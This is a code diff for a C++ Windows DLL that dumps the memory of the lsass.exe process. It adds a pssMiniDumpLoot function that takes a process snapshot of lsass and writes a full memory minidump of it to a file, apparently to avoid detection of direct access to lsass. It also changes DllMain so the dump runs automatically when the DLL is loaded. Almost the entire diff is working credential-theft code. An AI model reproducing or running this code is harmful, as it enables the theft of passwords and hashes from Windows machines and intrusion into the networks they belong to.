@@ -2,6 +2,7 @@
 #include <Windows.h>
 #include <DbgHelp.h>
 #include <TlHelp32.h>
+#include <ProcessSnapshot.h>
 #include "pch.h"
 
 #define SE_DEBUG_PRIVILEGE 20
@@ -32,12 +33,69 @@ DWORD getPID(LPCWSTR procName = L"lsass.exe") {
 	return processId;
 }
 
+// minidump lsass process memory to file
 BOOL miniDumpLoot() {
 	DWORD processId = getPID();
 	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
 	HANDLE hFile = CreateFile(dmpPath, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 	BOOL cDump = MiniDumpWriteDump(hProcess,processId,hFile,MiniDumpWithFullMemory,NULL,NULL,NULL);
 
+	CloseHandle(hFile);
+	CloseHandle(hProcess);
+
+	return cDump;
+}
+
+// callback routine for MiniDumpWriteDump to tell it to read snapshot data instead of process handle
+BOOL CALLBACK MyMiniDumpWriteDumpCallback(
+  __in     PVOID CallbackParam,
+  __in     const PMINIDUMP_CALLBACK_INPUT CallbackInput,
+  __inout  PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
+)
+{
+    switch (CallbackInput->CallbackType)
+    {
+        case 16: // IsProcessSnapshotCallback
+            CallbackOutput->Status = S_FALSE;
+            break;
+    }
+    return TRUE;
+}
+
+// ref: https://docs.microsoft.com/en-us/previous-versions/windows/desktop/proc_snap/export-a-process-snapshot-to-a-file
+// capture process snapshot then minidump lsass from snapshot to file
+BOOL pssMiniDumpLoot() {
+	DWORD processId = getPID();
+	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+	HANDLE hFile = CreateFile(dmpPath, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+	DWORD CaptureFlags = (DWORD)PSS_CAPTURE_VA_CLONE
+                            | PSS_CAPTURE_HANDLES
+                            | PSS_CAPTURE_HANDLE_NAME_INFORMATION
+                            | PSS_CAPTURE_HANDLE_BASIC_INFORMATION
+                            | PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION
+                            | PSS_CAPTURE_HANDLE_TRACE
+                            | PSS_CAPTURE_THREADS
+                            | PSS_CAPTURE_THREAD_CONTEXT
+                            | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED
+                            | PSS_CREATE_BREAKAWAY
+                            | PSS_CREATE_BREAKAWAY_OPTIONAL
+                            | PSS_CREATE_USE_VM_ALLOCATIONS
+                            | PSS_CREATE_RELEASE_SECTION;
+	HPSS SnapshotHandle;
+	// capture snapshot of lsass process
+	DWORD dwResultCode = PssCaptureSnapshot(hProcess, (PSS_CAPTURE_FLAGS)CaptureFlags, CONTEXT_ALL, &SnapshotHandle);
+	if (dwResultCode != ERROR_SUCCESS) return false;
+
+
+	MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
+	ZeroMemory(&CallbackInfo, sizeof (MINIDUMP_CALLBACK_INFORMATION));
+	CallbackInfo.CallbackRoutine = MyMiniDumpWriteDumpCallback;
+	CallbackInfo.CallbackParam = NULL;
+	// use callback routine to tell MiniDumpWriteDump to capture from snapshot
+	BOOL cDump = MiniDumpWriteDump(SnapshotHandle,processId,hFile,MiniDumpWithFullMemory,NULL,NULL,&CallbackInfo);
+
+	PssFreeSnapshot(GetCurrentProcess(), SnapshotHandle);
 	CloseHandle(hFile);
 	CloseHandle(hProcess);
 
@@ -120,10 +178,10 @@ BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpRese
     {
     case DLL_PROCESS_ATTACH:
 		setRtlSEDebug();
-		miniDumpLoot();
+		pssMiniDumpLoot();
     case DLL_THREAD_ATTACH:
 		setRtlSEDebug();
-		miniDumpLoot();
+		pssMiniDumpLoot();
     case DLL_THREAD_DETACH:
     case DLL_PROCESS_DETACH:
         break;
